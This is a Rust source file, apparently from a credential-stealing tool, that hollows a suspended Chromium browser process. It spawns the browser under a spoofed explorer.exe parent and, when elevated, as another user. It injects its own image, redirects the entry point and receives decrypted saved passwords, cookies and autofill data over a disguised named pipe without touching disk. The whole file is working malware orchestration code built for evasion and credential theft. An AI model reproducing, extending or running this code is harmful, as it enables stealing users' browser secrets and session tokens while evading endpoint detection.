//! Parent-side orchestration of the in-browser credential extraction: a
//! suspended browser instance is made to run THIS binary's image (mapped as a
//! genuine `SEC_IMAGE` section), reads its own profile stores under its own
//! identity, and streams the rows back over an authenticated named pipe. This
//! process never opens `Local State`, `Login Data`, `Cookies` or `Web Data`.
//!
//! Sequence: create the pipe → spawn the browser suspended (parent spoofed to
//! the shell; spawned as the profile-OWNING user when we are elevated and the
//! profile belongs to someone else, since DPAPI/ABE unwrap only works in the
//! owner's logon context) → map our image, fix the PEB image base, plant the
//! mailbox → redirect the thread to our entry point and resume → read the
//! frame stream under a deadline. The child is terminated on every exit path
//! (its Drop) and nothing is written to disk.

use std::path::Path;
use std::time::{Duration, Instant};

use anyhow::Context;

use crate::inventory::Browser;
use crate::model::{ProfileSummary, Row};
use crate::options::RunOptions;
use crate::wire::{self, Event};

use super::conduit::{self, Listener};
use super::image::PeImage;
use super::postbox;
use super::proc::{self, Child};

/// Fixed address for the mailbox page: a just-created suspended process has
/// essentially its whole address space free, so a fixed high address is
/// reliable, and the address must be known before spawn (it travels in the
/// child's environment block).
const MAILBOX_BASE: usize = 0x1_0000_0000;
/// Hard deadline for the whole exchange (connect + full stream). A payload
/// that exits early is detected within ~half a second; this only bounds a
/// live-but-stuck payload (e.g. a hung RPC call).
const EXCHANGE_TIMEOUT: Duration = Duration::from_secs(60);

/// Minimal environment for the hollowed child: a custom block REPLACES the
/// parent environment — inheriting it wholesale would hand the payload our
/// variables, credentials and proxy settings.
const CHILD_ENV_ALLOWLIST: &[&str] = &[
    "SYSTEMROOT",
    "WINDIR",
    "SYSTEMDRIVE",
    "COMSPEC",
    "PROGRAMFILES",
    "PROGRAMFILES(X86)",
    "PROGRAMW6432",
    "TEMP",
    "TMP",
    "PATH",
];

/// Everything the payload reported back.
#[derive(Debug, Default)]
pub struct HollowExtraction {
    /// The payload's key status ("abe" | "dpapi" | "abe+dpapi" |
    /// "unavailable: ..." | "error: ...").
    pub key_status: String,
    /// Profile summaries (paths + counts) seen by the payload.
    pub profiles: Vec<ProfileSummary>,
    /// Credential-class rows, already decrypted by the payload.
    pub rows: Vec<Row>,
    /// Store-level failure notes (merged into collection_errors).
    pub errors: Vec<String>,
}

/// Runs the credential-store extraction for one Chromium browser inside a
/// hollowed instance of that browser.
///
/// # Errors
/// Propagates every stage's failure — the caller falls back to local
/// plaintext-only collection; this path must never panic.
pub fn extract_via_hollow(
    browser: &Browser,
    opts: &RunOptions,
) -> anyhow::Result<HollowExtraction> {
    let target = crate::inventory::hollow_target(browser)
        .ok_or_else(|| anyhow::anyhow!("no browser binary found on disk"))?;
    let exe = std::env::current_exe().context("cannot locate own executable")?;
    let bytes = std::fs::read(&exe).context("cannot read own executable")?;
    let image = PeImage::parse(&bytes).context("own executable is not a usable PE image")?;
    attempt(browser, opts, &image, &target, &exe)
}

fn attempt(
    browser: &Browser,
    opts: &RunOptions,
    image: &PeImage,
    target: &Path,
    exe: &Path,
) -> anyhow::Result<HollowExtraction> {
    // Response channel, created before spawn so the payload can connect the
    // moment it starts. The name mimics the browser's own IPC pattern.
    let seed = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos() as u64)
        .unwrap_or(0)
        ^ u64::from(std::process::id());
    let pipe_name = conduit::pipe_name(browser.id, seed);
    let listener = Listener::listen(&pipe_name).context("create pipe")?;

    // Minimal environment + our two markers.
    let mut env: Vec<(String, String)> = std::env::vars()
        .filter(|(key, _)| {
            CHILD_ENV_ALLOWLIST
                .iter()
                .any(|a| key.eq_ignore_ascii_case(a))
        })
        .collect();
    env.push((
        postbox::MAILBOX_ENV.to_string(),
        format!("0x{MAILBOX_BASE:x}"),
    ));
    env.push((conduit::PIPE_ENV.to_string(), pipe_name.clone()));

    // As the profile owner when possible (DPAPI/ABE secrets unwrap only in
    // the owner's logon context); as ourselves otherwise.
    let user_token = proc::owner_token_for(&browser.user_data);
    let explorer = explorer_pid();
    let child = match &user_token {
        Some(token) => {
            proc::spawn_suspended_as_user(token.raw(), &target.to_string_lossy(), &env, explorer)
        }
        None => proc::spawn_suspended(&target.to_string_lossy(), &env, explorer),
    }
    .context("spawn browser suspended")?;
    // `child` terminates the process on drop, whatever happens below.

    run_stages(browser, opts, image, exe, &child, listener, &pipe_name)
}

/// The shell's PID (for parent spoofing), via the taskbar window — the
/// browser appears launched by the shell rather than by us.
fn explorer_pid() -> Option<u32> {
    use windows_sys::Win32::UI::WindowsAndMessaging::{FindWindowW, GetWindowThreadProcessId};
    // SAFETY: class-name wide string is valid; a missing window yields null.
    let hwnd = unsafe { FindWindowW(wide_class().as_ptr(), std::ptr::null()) };
    if hwnd.is_null() {
        return None;
    }
    let mut pid = 0u32;
    // SAFETY: `pid` valid for write.
    unsafe { GetWindowThreadProcessId(hwnd, &mut pid) };
    (pid != 0).then_some(pid)
}

fn wide_class() -> Vec<u16> {
    // "Shell_TrayWnd" — the taskbar window class owned by explorer.exe.
    "Shell_TrayWnd"
        .encode_utf16()
        .chain(std::iter::once(0))
        .collect()
}

#[allow(clippy::too_many_arguments)]
fn run_stages(
    browser: &Browser,
    opts: &RunOptions,
    image: &PeImage,
    exe: &Path,
    child: &Child,
    listener: Listener,
    pipe_name: &str,
) -> anyhow::Result<HollowExtraction> {
    // Map our own executable as a genuine SEC_IMAGE view — section-backed
    // (MEM_IMAGE), which the OS loader fully accepts. The browser's original
    // image stays mapped (some loader paths reference the initial section);
    // the PEB image base below is what makes OUR image the executable.
    let base = proc::map_image(child, exe, image.preferred_base() as *mut std::ffi::c_void)
        .context("map image section")?;
    proc::set_image_base(child, base).context("fix PEB image base")?;

    // Plant the request: browser id, per-run auth token, the discovered
    // per-user user-data root, and the run options as JSON. The token
    // authenticates every pipe frame; the root travels with the request
    // because discovery is per-user (elevated runs see every user's
    // profiles) — the payload must read THAT user's `Local State`.
    let token = run_token();
    let options_json = serde_json::to_string(opts).context("serialize run options")?;
    let blob = postbox::encode_blob(&token, &browser.user_data, &options_json);
    let request = postbox::encode_request(browser.id, &blob)?;
    let mailbox = MAILBOX_BASE as *mut std::ffi::c_void;
    let page = proc::alloc_at(child, mailbox, postbox::MAILBOX_SIZE).context("alloc mailbox")?;
    if page != mailbox {
        anyhow::bail!("mailbox could not be placed at its fixed address");
    }
    proc::write_memory(child, mailbox, &request).context("write request")?;

    proc::set_entry(
        child,
        (base as usize).wrapping_add(image.entry_rva() as usize) as *const std::ffi::c_void,
    )
    .context("set entry point")?;
    proc::resume(child).context("resume")?;

    let result = read_stream(
        listener,
        pipe_name,
        &token,
        child,
        base as u64,
        u64::from(image.size_of_image()),
    );
    if result.is_err() {
        // The payload may have posted a fatal reason in the mailbox (e.g. an
        // unreachable pipe) — surface it for diagnostics.
        if let Ok(reason) = read_mailbox_response(child, mailbox) {
            if !reason.is_empty() {
                return result.map_err(|e| {
                    anyhow::anyhow!(
                        "{e:#}; payload reported: {}",
                        String::from_utf8_lossy(&reason)
                    )
                });
            }
        }
    }
    result
}

/// Drives the reader with a hard deadline, watching for early payload exit:
/// a payload that crashed at startup never connects, and waiting out the
/// deadline per browser would be wasteful — so the exit code is polled every
/// ~10 ms alongside instruction-pointer samples that bracket a crash site.
/// On deadline, a throwaway self-connect releases an accept-stage wait.
fn read_stream(
    mut listener: Listener,
    pipe_name: &str,
    token: &[u8; 16],
    child: &Child,
    image_base: u64,
    image_size: u64,
) -> anyhow::Result<HollowExtraction> {
    let token_hex = wire::hex_encode(token);
    let expected_pid = child.pid();
    let (tx, rx) = std::sync::mpsc::channel();
    std::thread::spawn(move || {
        let _ = tx.send(read_frames(&mut listener, &token_hex, expected_pid));
    });
    let deadline = Instant::now() + EXCHANGE_TIMEOUT;
    let mut rips: Vec<u64> = Vec::new();
    loop {
        match rx.recv_timeout(Duration::from_millis(10)) {
            Ok(result) => return result,
            Err(std::sync::mpsc::RecvTimeoutError::Disconnected) => {
                anyhow::bail!("payload stream reader thread died");
            }
            Err(std::sync::mpsc::RecvTimeoutError::Timeout) => {
                if let Ok(rip) = proc::thread_rip(child) {
                    if rips.last() != Some(&rip) {
                        rips.push(rip);
                        if rips.len() > 8 {
                            rips.remove(0);
                        }
                    }
                }
                if let Ok(Some(code)) = proc::exit_code(child) {
                    anyhow::bail!(
                        "payload exited before completing the stream (exit code 0x{code:08x}, {})",
                        describe_rips(&rips, image_base, image_size),
                    );
                }
                if Instant::now() >= deadline {
                    if let Ok(client) = conduit::Client::connect(pipe_name, Duration::from_secs(1))
                    {
                        drop(client);
                    }
                    let _ = rx.recv_timeout(Duration::from_secs(3));
                    anyhow::bail!(
                        "payload stream timed out after {}s ({})",
                        EXCHANGE_TIMEOUT.as_secs(),
                        describe_rips(&rips, image_base, image_size),
                    );
                }
            }
        }
    }
}

/// Renders sampled instruction pointers, mapping addresses inside our mapped
/// image to `payload+RVA` so a crash site can be found with a disassembler.
fn describe_rips(rips: &[u64], image_base: u64, image_size: u64) -> String {
    if rips.is_empty() {
        return "no thread samples".to_string();
    }
    let parts: Vec<String> = rips
        .iter()
        .map(|rip| {
            if (*rip >= image_base) && (*rip < image_base + image_size) {
                format!("payload+0x{:x}", *rip - image_base)
            } else {
                format!("0x{rip:x}")
            }
        })
        .collect();
    format!("last thread ips: {}", parts.join(" -> "))
}

/// The frame loop: connect, verify the peer PID, then validated records
/// until `done`/EOF/error.
fn read_frames(
    listener: &mut Listener,
    token: &str,
    expected_pid: u32,
) -> anyhow::Result<HollowExtraction> {
    listener
        .wait_connected()
        .context("payload never connected")?;
    listener.verify_client_pid(expected_pid)?;
    let mut out = HollowExtraction::default();
    let mut validator = wire::Validator::new(token);
    loop {
        let Some(frame) = listener.read_frame().context("read frame")? else {
            anyhow::bail!("payload stream ended before 'done'");
        };
        match validator.accept(&frame)? {
            Event::Status(status) => out.key_status = status,
            Event::Profile(profile) => out.profiles.push(profile),
            Event::Row(row) => out.rows.push(row),
            Event::Note(note) => {
                if !note.is_empty() {
                    out.errors.push(note);
                }
            }
            Event::Done => return Ok(out),
        }
    }
}

/// The per-run auth token: cryptographic-quality OS random bytes; it only
/// has to be unguessable to other local processes (which cannot read the
/// child's mailbox page).
fn run_token() -> [u8; 16] {
    let mut out = [0u8; 16];
    if getrandom::getrandom(&mut out).is_err() {
        // Practically unreachable; fall back to time+PID mixed entropy.
        let mut s = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_nanos() as u64)
            .unwrap_or(0)
            ^ u64::from(std::process::id()).rotate_left(17);
        for chunk in out.chunks_exact_mut(8) {
            // xorshift64*
            s ^= s >> 12;
            s ^= s << 25;
            s ^= s >> 27;
            s = s.wrapping_mul(0x2545_F491_4F6C_DD1D);
            chunk.copy_from_slice(&s.to_le_bytes());
        }
    }
    out
}

/// Reads the (optional) fatal-error note the payload posted in the mailbox
/// response region before exiting.
fn read_mailbox_response(child: &Child, mailbox: *mut std::ffi::c_void) -> anyhow::Result<Vec<u8>> {
    let at = (mailbox as usize + postbox::RESPONSE_OFFSET) as *mut std::ffi::c_void;
    let mut header = [0u8; 8];
    proc::read_memory(child, at, &mut header).context("read response header")?;
    let len = u32::from_le_bytes(header[4..8].try_into().unwrap_or([0; 4])) as usize;
    let capacity = postbox::MAILBOX_SIZE - postbox::RESPONSE_OFFSET - 8;
    if len > capacity {
        anyhow::bail!("payload response length out of range");
    }
    let mut payload = vec![0u8; len];
    if len > 0 {
        proc::read_memory(child, at.wrapping_add(8), &mut payload).context("read response body")?;
    }
    Ok(payload)
}
